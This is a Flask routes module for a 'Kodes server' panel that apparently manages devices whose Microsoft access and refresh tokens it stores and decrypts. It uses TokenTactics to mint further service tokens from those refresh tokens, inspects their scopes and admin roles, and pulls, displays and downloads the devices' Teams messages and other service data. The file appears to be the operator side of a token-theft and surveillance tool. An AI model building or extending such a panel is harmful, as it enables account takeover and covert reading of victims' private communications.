"""
Web interface routes for the Kodes server.
"""
from flask import Blueprint, render_template, jsonify, Response, current_app, request
import logging
import humanize
from datetime import datetime
from ..models import DeviceInfo
from ..utils.security import decrypt_token
from .auth import login_required

logger = logging.getLogger(__name__)

web_bp = Blueprint('web', __name__)


@web_bp.route('/devices', methods=['GET'])
@login_required
def list_devices():
    """
    Display list of connected devices.
    """
    devices = DeviceInfo.query.all()
    return render_template('devices.html', devices=devices)


def humanize_date(date):
    """
    Format date as human-readable relative time.
    """
    if not date:
        return "Never"
    return humanize.naturaltime(datetime.now() - date)


@web_bp.route('/api/teams/messages/<hostname>')
@login_required
def get_teams_messages_route(hostname):
    """
    API endpoint to get Teams messages for a device.
    This now uses the asynchronous cached approach.
    """
    from ..services.powershell import PowerShellService
    
    force_refresh = request.args.get('refresh', 'false').lower() == 'true'
    
    ps_service = PowerShellService()
    result = ps_service.get_teams_messages(hostname, force_refresh)
    
    if result['status'] == 'completed':
        messages = ps_service.get_teams_messages_content(hostname, formatted=True)
        return jsonify(messages)
    else:
        return jsonify(result)
    
@web_bp.route('/api/token/scope/<hostname>')
@login_required
def get_token_scope(hostname):
    """
    API endpoint to get token scope information for a device.
    """
    import json
    from ..utils.security import parse_jwt_token

    device_info = DeviceInfo.query.filter_by(hostname=hostname).first()
    
    if not device_info or not device_info.access_token:
        return jsonify({"error": "No access token found for this hostname"})
    
    access_token = decrypt_token(device_info.access_token)
    if not access_token:
        return jsonify({"error": "Error decrypting access token"})
    
    token_payload = parse_jwt_token(access_token)
    
    response = {
        "subject": token_payload.get("sub", ""),
        "name": token_payload.get("name", ""),
        "upn": token_payload.get("upn", ""),
        "audience": token_payload.get("aud", ""),
        "issuer": token_payload.get("iss", ""),
        "tenant_id": token_payload.get("tid", ""),
        "scopes": token_payload.get("scopes", token_payload.get("scp", "").split() if isinstance(token_payload.get("scp", ""), str) else token_payload.get("scp", [])),
        "roles": token_payload.get("roles", []),
        "has_admin_permissions": token_payload.get("has_admin_scopes", False) or token_payload.get("has_admin_role", False),
        "expires_at": token_payload.get("exp", 0),
        "expires_in_minutes": token_payload.get("expires_in_minutes", 0),
        "token_service": token_payload.get("token_service", "Unknown")
    }
    
    if device_info.scopes:
        try:
            response["scopes_from_db"] = json.loads(device_info.scopes)
        except:
            pass
            
    if device_info.roles:
        try:
            response["roles_from_db"] = json.loads(device_info.roles)
        except:
            pass
    
    return jsonify(response)

@web_bp.route('/api/teams/token/generate/<hostname>')
@login_required
def generate_teams_token(hostname):
    """
    API endpoint to generate a Teams token from refresh token.
    """
    from ..services.powershell import PowerShellService
    
    device_info = DeviceInfo.query.filter_by(hostname=hostname).first()
    
    if not device_info or not device_info.refresh_token:
        return jsonify({"error": "No refresh token found for this hostname"})
    
    ps_service = PowerShellService()
    success, result = ps_service.generate_teams_token(hostname)
    
    if success:
        return jsonify({"success": True, "message": "Teams token generated successfully"})
    else:
        return jsonify({"error": result})


@web_bp.route('/api/teams/messages/<hostname>/download')
@login_required
def download_teams_messages(hostname):
    """
    Download Teams messages as a text file.
    Uses the cached data if available.
    """
    from ..services.powershell import PowerShellService
    
    ps_service = PowerShellService()
    
    status_info = ps_service.get_teams_messages_status(hostname)
    
    if status_info.get('status') != 'completed':
        if status_info.get('status') not in ['processing', 'pending']:
            ps_service.get_teams_messages(hostname)
        return f"Data is not ready yet. Current status: {status_info.get('status', 'unknown')}. Please try again later."
    
    output = ps_service.get_teams_messages_content(hostname, formatted=False)
    
    return Response(
        output,
        mimetype='text/plain; charset=utf-8',
        headers={'Content-Disposition': f'attachment;filename=teams_messages_{hostname}.txt'}
    )
    
@web_bp.route('/api/teams/messages/<hostname>/status')
@login_required
def get_teams_messages_status(hostname):
    """
    API endpoint to check the status of a Teams messages retrieval process.
    """
    from ..services.powershell import PowerShellService

    ps_service = PowerShellService()
    status = ps_service.get_teams_messages_status(hostname)

    return jsonify(status)


@web_bp.route('/api/device/<hostname>/delete', methods=['POST'])
@login_required
def delete_device(hostname):
    """
    API endpoint to delete a device and its cached Teams data.
    Log entries are kept for audit.
    """
    from ..models import db, Log, TeamsMessages

    device = DeviceInfo.query.filter_by(hostname=hostname).first()
    if not device:
        return jsonify({"error": "Device not found"})

    try:
        TeamsMessages.query.filter_by(hostname=hostname).delete()
        db.session.delete(device)
        db.session.commit()

        log_entry = Log(hostname=hostname, log_message="Device deleted via panel")
        db.session.add(log_entry)
        db.session.commit()

        return jsonify({"success": True, "message": f"{hostname} silindi"})
    except Exception as e:
        db.session.rollback()
        logger.error(f"Error deleting device {hostname}: {e}")
        return jsonify({"error": str(e)})

@web_bp.route('/devices/<hostname>', methods=['GET'])
@login_required
def device_detail(hostname):
    """
    Device detail page: identity, connection, token/permission analysis,
    service tokens and device logs on a single screen.
    """
    from ..models import Log
    from ..services.powershell import PowerShellService, TOKEN_SERVICES

    device = DeviceInfo.query.filter_by(hostname=hostname).first()
    if not device:
        from flask import flash, redirect, url_for
        flash(f"Device not found: {hostname}", "error")
        return redirect(url_for('web.list_devices'))

    logs = Log.query.filter_by(hostname=hostname).order_by(
        Log.timestamp.desc()).limit(50).all()

    generated = PowerShellService.get_service_tokens_map(hostname)
    recommendations = PowerShellService.recommendations_for_device(hostname)

    from ..services.data import ServiceDataService
    data_resources = ServiceDataService.available_resources(hostname)

    import json as _json
    try:
        scopes = _json.loads(device.scopes) if device.scopes else []
    except (ValueError, TypeError):
        scopes = []
    try:
        roles = _json.loads(device.roles) if device.roles else []
    except (ValueError, TypeError):
        roles = []

    return render_template('device_detail.html',
                           device=device,
                           logs=logs,
                           generated=generated,
                           recommendations=recommendations,
                           data_resources=data_resources,
                           scopes=scopes,
                           roles=roles,
                           token_services=TOKEN_SERVICES)


@web_bp.route('/api/device/<hostname>/token/<service_key>/generate')
@login_required
def generate_service_token_route(hostname, service_key):
    """
    Mints a TokenTactics token from the refresh token for a service.
    """
    from ..services.powershell import PowerShellService

    ps_service = PowerShellService()
    success, result = ps_service.generate_service_token(hostname, service_key)

    if success:
        return jsonify({"success": True, "message": result})
    return jsonify({"error": result})



@web_bp.route('/api/device/<hostname>/tokens')
@login_required
def list_service_tokens(hostname):
    """
    Map of minted service tokens for a device: {service: minted?}
    """
    from ..services.powershell import PowerShellService
    return jsonify(PowerShellService.get_service_tokens_map(hostname))


@web_bp.route('/api/device/<hostname>/resources')
@login_required
def available_data_resources(hostname):
    """
    Viewable REST resources of services with a minted token.
    """
    from ..services.data import ServiceDataService
    return jsonify(ServiceDataService.available_resources(hostname))


@web_bp.route('/api/device/<hostname>/data/<service_key>/<resource_key>')
@login_required
def fetch_service_data(hostname, service_key, resource_key):
    """
    Fetches service data — First N (?top=N) or everything (?full=true).
    """
    from ..services.data import ServiceDataService

    top = request.args.get('top', '25')
    full = request.args.get('full', 'false').lower() == 'true'

    result = ServiceDataService.fetch_resource(
        hostname, service_key, resource_key, top=top, full=full)
    return jsonify(result)


@web_bp.route('/api/device/<hostname>/token/<service_key>/inspect')
@login_required
def inspect_service_token(hostname, service_key):
    """
    Returns the service token's JWT claims (a data view for every service).
    """
    from ..services.data import ServiceDataService
    return jsonify(ServiceDataService.inspect_token(hostname, service_key))


@web_bp.record_once
def on_load(state):
    state.app.jinja_env.filters['humanize'] = humanize_date